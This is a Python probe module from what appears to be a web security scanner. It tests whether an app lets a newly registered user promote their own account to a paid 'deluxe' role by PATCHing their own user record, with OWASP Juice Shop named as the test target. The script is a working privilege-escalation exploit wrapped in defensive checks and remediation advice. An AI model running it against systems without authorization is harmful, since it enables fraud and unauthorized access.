#!/usr/bin/env python3
# Author: Tim Rice <tim.j.rice@hackrange.com>
# Part of nextgen-dast. See README.md for license and overall architecture.
"""
Authorization: caller can self-promote to a paid tier ("deluxe").

Some apps gate paid features on a `role` field that's mutable through
the same `/api/Users/<own_id>` PATCH used for profile edits. The
client should only be allowed to set non-privileged fields (display
name, avatar); the privileged fields — `role`, `deluxe`, `tier` —
should require either an admin caller or a payment webhook.

Detection signal:
  Register a free user, log in, PATCH /api/Users/<own_id> with
  `{"role":"deluxe"}`. GET /rest/user/whoami → role reflects "deluxe".

Destructive (we mutate the throwaway user record). Off by default.

Tested against:
  + OWASP Juice Shop  PATCH on /api/Users/<own> updates role →
                      validated=True (when --allow-destroy is set).
  + nginx default site → validated=False
"""
from __future__ import annotations

import json
import secrets
import sys
from pathlib import Path
from urllib.parse import urljoin, urlparse

sys.path.insert(0, str(Path(__file__).parent.parent))
from lib import Probe, Verdict, SafeClient   # noqa: E402

USERS_PATH  = "/api/Users/{id}"
WHOAMI_PATH = "/rest/user/whoami"


def _register_and_login(client: SafeClient, origin: str) -> dict:
    email = f"deluxe-tamper-{secrets.token_hex(6)}@dast.test"
    pw    = "Pr0be-" + secrets.token_hex(4)
    out: dict = {"email": email, "password": pw, "token": None,
                 "user_id": None, "user_email": email}
    body = json.dumps({"email": email, "password": pw,
                       "passwordRepeat": pw,
                       "securityQuestion": {"id": 1},
                       "securityAnswer": "probe"}).encode()
    r = client.request("POST", urljoin(origin, "/api/Users"),
                       headers={"Content-Type": "application/json"},
                       body=body)
    out["register_status"] = r.status
    if r.status in (200, 201) and r.body:
        try:
            doc = json.loads(r.text)
            data = doc.get("data") if isinstance(doc, dict) else None
            uid = (data or {}).get("id") if isinstance(data, dict) else None
            out["user_id"] = uid
        except json.JSONDecodeError:
            pass

    body = json.dumps({"email": email, "password": pw}).encode()
    r = client.request("POST", urljoin(origin, "/rest/user/login"),
                       headers={"Content-Type": "application/json"},
                       body=body)
    out["login_status"] = r.status
    if r.status == 200 and r.body:
        try:
            doc = json.loads(r.text) or {}
            auth = doc.get("authentication") or {}
            out["token"] = auth.get("token")
            if out["user_id"] is None:
                out["user_id"] = auth.get("uid") or auth.get("id")
        except json.JSONDecodeError:
            pass
    return out


class DeluxeMembershipTamperProbe(Probe):
    name = "authz_deluxe_membership_tamper"
    summary = ("Detects price-tampering / privileged-role self-"
               "assignment via PATCH /api/Users/<own_id>.")
    safety_class = "destructive"

    def add_args(self, parser):
        parser.add_argument(
            "--target-role", default="deluxe",
            help="Privileged role value to attempt to set "
                 "(default: deluxe).")
        parser.add_argument(
            "--allow-destroy", action="store_true",
            help="Required — probe mutates the throwaway user record.")

    def run(self, args, client: SafeClient) -> Verdict:
        if not args.url:
            return Verdict(ok=False, error="--url is required")
        parsed = urlparse(args.url)
        origin = f"{parsed.scheme}://{parsed.netloc}"
        if not getattr(args, "allow_destroy", False):
            return Verdict(
                validated=None, confidence=0.0,
                summary=("Skipped: probe mutates the user record. "
                         "Re-run with --allow-destroy."),
                evidence={"origin": origin, "safety_skipped": True},
            )
        sess = _register_and_login(client, origin)
        if not sess.get("token") or not sess.get("user_id"):
            return Verdict(
                validated=False, confidence=0.6,
                summary=f"Inconclusive: no probe session on {origin}.",
                evidence={"origin": origin,
                          "session": {k: v for k, v in sess.items()
                                      if k != "password"}},
            )
        token = sess["token"]
        uid   = sess["user_id"]
        target_role = (args.target_role or "deluxe").strip().lower()

        # Patch own role.
        r = client.request("PATCH",
                           urljoin(origin, USERS_PATH.format(id=uid)),
                           headers={"Authorization": f"Bearer {token}",
                                    "Content-Type": "application/json"},
                           body=json.dumps({"role": target_role}).encode())
        write = {"step": "patch-own-role", "status": r.status,
                 "size": r.size, "body_excerpt": (r.text or "")[:200]}

        # Verify via whoami.
        r2 = client.request("GET", urljoin(origin, WHOAMI_PATH),
                            headers={"Authorization": f"Bearer {token}"})
        read = {"step": "verify-whoami", "status": r2.status,
                "size": r2.size, "body_excerpt": (r2.text or "")[:200]}
        effective_role = None
        confirmed = False
        if r2.status == 200 and r2.body:
            try:
                doc = json.loads(r2.text)
                # whoami nests under data on Juice Shop, may be flat
                # elsewhere — check both.
                user_doc = (doc.get("user") if isinstance(doc, dict) else None) \
                          or (doc.get("data") if isinstance(doc, dict) else None) \
                          or doc
                if isinstance(user_doc, dict):
                    role = user_doc.get("role")
                    if isinstance(role, str):
                        effective_role = role
                        if role.lower() == target_role:
                            confirmed = True
            except json.JSONDecodeError:
                pass
        read["effective_role"] = effective_role

        evidence = {"origin": origin,
                    "session_email": sess.get("user_email"),
                    "user_id": uid, "target_role": target_role,
                    "attempts": [write, read]}
        if confirmed:
            return Verdict(
                validated=True, confidence=0.95,
                summary=(f"Confirmed: caller self-promoted to "
                         f"role={target_role!r} via PATCH "
                         f"{origin}{USERS_PATH.format(id=uid)} — no "
                         "payment / admin gate."),
                evidence=evidence,
                severity_uplift="high",
                remediation=(
                    "Strip the `role`, `deluxe`, `tier`, and similar "
                    "privileged fields from the request schema for "
                    "PATCH /api/Users. Promotion to a paid tier should "
                    "happen ONLY in response to a verified payment "
                    "webhook (Stripe / Braintree / etc.); promotion to "
                    "an admin role should require an admin caller. The "
                    "user-editable surface for this endpoint is "
                    "limited to display-only attributes."),
            )
        return Verdict(
            validated=False, confidence=0.85,
            summary=(f"Refuted: PATCH /api/Users/<own> with role="
                     f"{target_role!r} did not persist."),
            evidence=evidence,
        )


if __name__ == "__main__":
    DeluxeMembershipTamperProbe().main()
